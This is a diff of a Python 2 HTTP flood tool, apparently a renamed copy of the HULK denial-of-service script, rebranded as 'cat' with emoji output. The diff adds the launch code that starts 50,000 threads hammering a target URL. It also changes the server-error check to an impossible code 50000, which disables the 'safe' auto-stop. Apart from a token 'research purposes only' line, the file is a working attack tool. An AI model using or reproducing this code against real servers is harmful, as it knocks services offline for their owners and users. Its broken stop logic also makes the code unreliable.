@@ -1,30 +1,26 @@
 # ----------------------------------------------------------------------------------------------
-# makra - HTTP Unbearable Load King
+# cat - HTTP Unbearable Load King
 #
 # this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
-
+# to their knees by exhausting the resource pool, its is meant for research purposes only
+# and any malicious usage of this tool is prohibited.
+#
+# author :  Barry Shteiman , version 1.0
 # ----------------------------------------------------------------------------------------------
 import urllib2
 import sys
 import threading
 import random
 import re
-import socket
-import time
-import os
-import random
-
-
-
 
 #global params
 url=''
 host=''
 headers_useragents=[]
 headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+request_counter=10
+flag=10
+safe=10
 
 def inc_counter():
 	global request_counter
@@ -73,8 +69,20 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
 	print '---------------------------------------------------'
-	print 'USAGE: python makra.py <url>'
+	print 'USAGE: python cat.py <url>'
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
@@ -101,7 +109,7 @@ def httpcall(url):
 	except urllib2.HTTPError, e:
 			#print e.code
 			set_flag(1)
-			print 'Response Code 500'
+			print 'Response ☠️ Code 50000☠️'
 			code=500
 	except urllib2.URLError, e:
 			#print e.reason
@@ -118,7 +126,7 @@ class HTTPThread(threading.Thread):
 		try:
 			while flag<2:
 				code=httpcall(url)
-				if (code==500) & (safe==1):
+				if (code==50000) & (safe==1):
 					set_flag(2)
 		except Exception, ex:
 			pass
@@ -132,7 +140,7 @@ class MonitorThread(threading.Thread):
 				print "%d Requests Sent" % (request_counter)
 				previous=request_counter
 		if flag==2:
-			print "\n-- cat Attack Finished --"
+			print "\n-- 😾cat Attack Finished😾 --"
 
 #execute 
 if len(sys.argv) < 2:
@@ -143,5 +151,17 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- mkra Attack Started --"
-		if len(sys.argv)== 3
+		print "-- cat Attack Started --"
+		if len(sys.argv)== 3:
+			if sys.argv[2]=="safe":
+				set_safe()
+		url = sys.argv[1]
+		if url.count("/")==2:
+			url = url + "/"
+		m = re.search('(https?\://)?([^/]*)/?.*', url)
+		host = m.group(2)
+		for i in range(50000):
+			t = HTTPThread()
+			t.start()
+		t = MonitorThread()
+		t.start()
